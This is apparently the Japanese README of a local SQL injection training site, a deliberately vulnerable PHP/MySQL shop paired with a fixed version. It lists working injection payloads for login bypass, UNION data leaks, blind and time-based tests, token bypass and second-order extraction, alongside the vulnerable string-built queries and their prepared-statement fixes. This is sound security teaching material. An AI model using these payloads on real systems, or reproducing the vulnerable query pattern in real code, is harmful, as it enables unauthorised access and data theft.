# Hifumi Secure Shop -- SQLインジェクション講義用教材サイト（PHP + MySQL 版）

## 1. 概要

このアプリは **SQLインジェクション講座で講師が実演するためのローカル専用教材** です。
架空の社内 CRM / EC 管理システム「Hifumi Secure Shop」を模しており、同じ機能を持つ

- **脆弱版**: [`app_vulnerable.php`](app_vulnerable.php) -- `http://127.0.0.1:5050`
- **修正版**: [`app_secure.php`](app_secure.php)         -- `http://127.0.0.1:5010`

の 2 つを同時に起動し、同じ攻撃入力を試して「脆弱版では成功する／修正版では失敗する」ことを
画面上で見比べられるようにしています。

DB は **MySQL 8** を使用（Flask 版は SQLite）。

> **Flask 版との違い（重要）**：SQL の行末コメント記号として、SQLite では `--` 単体で成立しましたが、
> **MySQL では `--` の後ろに空白が必要** です。本 PHP 版では以下のように `#` を使用します：
>
> - ログインバイパス: `admin' #`（旧: `admin' --`）
> - UNION 系: `%' UNION SELECT ... #`
> - トークンバイパス: `' OR '1'='1' #`
> - セカンドオーダー: `nobody' UNION SELECT password FROM users WHERE username='admin' #`
>
> `-- ` （末尾スペース）でも動作しますが、講義では取り違えを避けるため `#` に統一しています。

## 2. 注意事項

- **学習目的専用です。** 実在のシステムに対してここで扱う攻撃手法を試さないでください。
- データはすべて架空の教材用データ（`init_db.php` 参照）。実在の個人情報・認証情報は含まれません。
- `app_vulnerable.php` は **意図的に脆弱な実装** を含みます。コード中に `WARNING: This query is intentionally vulnerable for training purposes.` というコメントを付けています。
- ユーザーのパスワードは **講義用に平文で保存**。実運用では `password_hash()` を使ってください。
- MySQL の `training_user` パスワードも講義用で固定。実運用ではシークレット管理必須。

## 3. 起動方法（Docker Compose）

```bash
cd sandbox/sqli-training-site-php
docker compose up --build
```

- 脆弱版: `http://127.0.0.1:5050`（コンテナ内部は 5000。macOS AirPlay 対策でホスト側を 5050 に）
- 修正版: `http://127.0.0.1:5010`
- MySQL:  `127.0.0.1:3306`（`training_user` / `training-demo-password`）

各アプリのコンテナは起動時に **自分のDB** を初期化します（脆弱版: `hifumi_vulnerable`、修正版: `hifumi_secure`）。
セカンドオーダーで DB が汚れたら `docker compose restart vulnerable secure` で再初期化できます。

## 4. ファイル構成

```
sandbox/sqli-training-site-php/
├── docker-compose.yml       # mysql + vulnerable + secure の 3 サービス
├── Dockerfile               # php:8.2-apache + PDO MySQL
├── config.php               # DB 接続設定（env で上書き可能）
├── init_db.php              # CLI: スキーマ + シードを流し込む
├── mysql/
│   ├── init/01-init.sql     # 初回起動時に走る DB/user 作成 SQL
│   └── conf.d/my.cnf        # MySQL サーバ設定（utf8mb4 等）
├── apache/
│   └── training.conf        # VirtualHost 定義（DOCROOT で切替）
├── static/                  # 両アプリ共有の静的アセット（Alias で公開）
│   ├── style.css
│   └── app.js
├── docroot/                 # Apache DocumentRoot をここに切替
│   ├── vulnerable/index.php # → require ../../app_vulnerable.php
│   └── secure/index.php     # → require ../../app_secure.php
├── lib/
│   ├── db.php               # PDO 接続ヘルパ
│   ├── auth.php             # セッション/アクセス制御
│   ├── layout.php           # 共通 HTML シェル
│   └── views.php            # 画面ごとの HTML 生成関数
├── app_vulnerable.php       # 脆弱版フロントコントローラ
├── app_secure.php           # 修正版フロントコントローラ
└── README.md
```

**サーバ構成**：Apache 2.4（`FallbackResource /index.php`）+ mod_php 8.2 + PDO MySQL。
docker-compose の `DOCROOT` 環境変数だけ変えて 1 つのイメージを 2 コンテナで使い分けています。

## 5. 講義用デモシナリオ（PHP + MySQL 版）

以下は脆弱版 (`http://127.0.0.1:5050`) を対象にした手順です。同じ入力を修正版 (`:5010`) にも試して、失敗することを確認してください。

### シナリオA: ユーザー列挙

`/login` に以下を入力:

```
存在しないユーザー名 + 適当なパスワード → 「そのユーザーは存在しません」
admin + わざと間違えたパスワード       → 「パスワードが違います」
```

### シナリオB: ログインバイパス

`/login` に以下を入力（パスワード欄は何でもよい）:

```
username: admin' #
password: anything
```

または:

```
username: admin' OR '1'='1' #
password: anything
```

### シナリオC: UNION による商品検索からの顧客情報漏洩

ログイン済みの状態で:

```
/catalog?q=%' UNION SELECT id, email, last_order_total FROM customers #
```

### シナリオD: 問い合わせ検索からの社内メモ漏洩

```
/contacts?q=%' UNION SELECT id, customer_name, email, internal_memo FROM contacts #
```

### シナリオE: Boolean-based Blind SQLi

```
/customer?id=1 AND 1=1   → 顧客情報が表示される
/customer?id=1 AND 1=2   → 「該当する顧客が見つかりません」
```

（発展）MySQL には本物の SLEEP() があるので、真の Time-based Blind も試せます：

```
/track?order_id=1 OR SLEEP(3)
```

応答が約 3 秒遅れます（SQLite の Flask 版では Python 側で疑似実装していました）。

### シナリオF: 招待トークン SQLi バイパス

`/register` に以下:

```
token:    ' OR '1'='1' #
username: nobody' UNION SELECT password FROM users WHERE username='admin' #
password: anything
```

トークンバイパスで登録が通り、ユーザー名に SQLi payload が保存されます。

### シナリオG: セカンドオーダー SQLi

シナリオF で登録した状態で `admin` としてログイン（シナリオB でバイパスできます）してから `/admin/report` を開くと、Latest Activity 列に `admin-secret`（admin の平文パスワード）が表示されます。

### シナリオH: 修正版で同じ攻撃が失敗することを確認

`http://127.0.0.1:5010` に切り替えて A〜G を再演。

- ログインバイパス → 失敗、常に「ユーザー名またはパスワードが正しくありません」
- UNION → 該当なし
- `?id=1 AND 1=2` → 400「idは整数で指定してください。」
- トークンバイパス → 「招待コードが無効です。」
- セカンドオーダー → `(no matching activity)` のまま

## 6. 脆弱版と修正版のコード差分

| 機能 | 脆弱版 (`app_vulnerable.php`) | 修正版 (`app_secure.php`) |
| --- | --- | --- |
| ログイン | `"...WHERE username = '{$username}' AND password = '{$password}'"` を `$pdo->query()` で発火 | `$pdo->prepare("... WHERE username = ? AND password = ?")->execute([$u,$p])` |
| 商品検索 | `"...WHERE name LIKE '%{$q}%'"` | `prepare("... LIKE ?")->execute(["%$q%"])` |
| 顧客詳細 | `"...WHERE id = {$raw_id}"`（数値コンテキスト無検証） | 整数正規表現で検証 → `prepare("... WHERE id = ?")` |
| 注文照会 | `"...WHERE id = {$raw_order_id}"` | 同上 |
| 問い合わせ | `"...WHERE message LIKE '%{$q}%'"` | プレースホルダ |
| 招待コード検証 | `"SELECT 1 FROM invite_tokens WHERE token = '{$token}' AND used = 0"` | `prepare("... token = ? AND used = 0")` |
| 管理者レポート | 登録は安全（プレースホルダ）／レポートで `"... c.name = '{$uname}'"` で再結合 → セカンドオーダー | レポート生成時も prepare |
| ログイン失敗メッセージ | 存在確認クエリで出し分け | 常に統一 |

全ての脆弱ポイントには `# WARNING: This query is intentionally vulnerable for training purposes.` というコメントを付けています。

## 7. トラブルシューティング

- **mysql コンテナが起動しない** — `docker compose logs mysql` を確認。ボリューム衝突ならボリューム名を変えるか `docker volume rm ...`
- **DB を完全にリセット** — `docker compose down -v && docker compose up --build`
- **login バイパスがなぜか成立しない** — payload の末尾 `#` を忘れていないか確認（`--` は MySQL では単独では効きません）
- **ホスト 5050 が塞がっている** — macOS AirPlay Receiver をオフに、または `docker-compose.yml` の脆弱版ポートを変更

## 8. Flask 版との関係

Flask + SQLite 版は [`sandbox/sqli-training-site/`](../sqli-training-site/) に残しています。
本講義は **PHP + MySQL 版をメイン** として進めます。
